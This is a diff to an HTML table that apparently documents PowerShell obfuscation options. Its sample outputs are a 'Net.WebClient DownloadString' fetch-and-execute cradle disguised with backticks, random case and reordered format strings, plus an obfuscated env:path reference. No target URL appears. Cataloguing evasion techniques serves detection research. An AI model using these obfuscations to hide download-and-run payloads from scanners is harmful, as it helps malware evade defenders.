@@ -70,7 +70,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
    <p>Invoke-Expression (New-Object Net.WebClient)."D`OWnlOa`DSTring"</p>
    <p>Invoke-Expression (New-Object Net.WebClient)."D`O`wnLo`AD`StrinG"</p>
   </td>
-  <td align="left">These options apply ticks.</td>
+  <td align="left">These options apply Ticks.</td>
  </tr>
  <tr>
   <td align="center">2</td>
@@ -114,16 +114,34 @@ you can copy the results from all cases for one or more obfuscation methods and 
  </tr> 
  <tr>
   <td align="center">5</td>
-  <td align="center">TOKEN\ARGUMENT\4</td>
+  <td align="center" nowrap>
+   <p>TOKEN\ARGUMENT\4</p>
+   <p>TOKEN\MEMBER\4</p>
+  </td>
   <td nowrap> 
+   <strong>TOKEN\ARGUMENT\4</strong>
    <p>Invoke-Expression (New-Object ("{2}{3}{0}{1}{4}"-f'bClie','n','N','et.We','t')).DownloadString</p>
    <p>Invoke-Expression (New-Object ("{0}{1}{2}{3}"-f'Net','.W','ebClie','nt')).DownloadString</p>
    <p>Invoke-Expression (New-Object ("{1}{0}{2}" -f 't.W','Ne','ebClient')).DownloadString</p>
+   <strong>TOKEN\MEMBER\4</strong>
+   <p>Invoke-Expression (New-Object Net.WebClient).("{2}{1}{4}{0}{3}"-f 'dStrin','n','Dow','g','loa')</p>
+   <p>Invoke-Expression (New-Object Net.WebClient).("{2}{3}{1}{0}"-f 'String','d','D','ownloa')</p>
+   <p>Invoke-Expression (New-Object Net.WebClient).("{2}{1}{3}{0}"-f 'g','nl','Dow','oadStrin')</p>
   </td>
   <td align="left">Just Reorder</td>
  </tr> 
  <tr>
   <td align="center">6</td>
+  <td align="center">TOKEN\VARIABLE\1</td>
+  <td nowrap> 
+   <p>${En`V:`p`ATh}</p>
+   <p>${e`Nv:pATh}</p>
+   <p>${ENv:`path}</p>
+  </td>
+  <td align="left">This option applies Random Case + {} + Ticks</td>
+ </tr> 
+ <tr>
+  <td align="center">7</td>
   <td align="center"></td>
   <td nowrap> 
    <p></p>
